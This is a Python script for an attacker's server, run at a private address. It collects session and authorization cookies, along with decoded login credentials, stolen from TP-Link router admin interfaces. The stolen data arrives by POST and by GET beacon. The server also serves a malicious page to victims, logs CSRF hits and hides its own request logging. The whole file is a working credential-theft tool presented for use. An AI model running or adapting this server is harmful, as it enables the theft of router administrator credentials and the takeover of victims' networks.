# Save as server.py on your attacker machine (10.100.63.3)
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse

class CookieHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/steal-cookies':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            print("\n" + "="*60)
            print("STOLEN COOKIES RECEIVED!")
            print("="*60)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                print(f"TP-Link IP: {data.get('tp_link_ip')}")
                print(f"All Cookies: {data.get('all_cookies')}")
                print(f"Authorization Cookie: {data.get('authorization_cookie')}")
                print(f"Decoded Credentials: {data.get('decoded_credentials')}")
                print(f"User Agent: {data.get('user_agent')}")
                print(f"Timestamp: {data.get('timestamp')}")
            except:
                print(f"Raw data: {post_data.decode('utf-8')}")
            
            print("="*60 + "\n")
            
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
            
        elif self.path == '/csrf0':
            # Handle the CSRF request if needed
            print("[+] CSRF request received")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'CSRF processed')
    
    def do_GET(self):
        if self.path.startswith('/collect'):
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            
            print("\n" + "="*60)
            print("STOLEN DATA (GET BEACON)!")
            print("="*60)
            
            if 'data' in params:
                import json
                try:
                    data = json.loads(params['data'][0])
                    print(f"Auth Cookie: {data.get('authorization_cookie')}")
                    print(f"Decoded: {data.get('decoded_credentials')}")
                except:
                    print(f"Data: {params['data'][0]}")
            
            print("="*60 + "\n")
            
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
        
        else:
            # Serve the HTML page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('steal.html', 'rb') as f:
                self.wfile.write(f.read())
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

print("[+] Starting cookie stealer server on 10.100.63.3:8080")
print("[+] Waiting for victims to visit the malicious page...")
server = HTTPServer(('0.0.0.0', 8080), CookieHandler)
server.serve_forever()
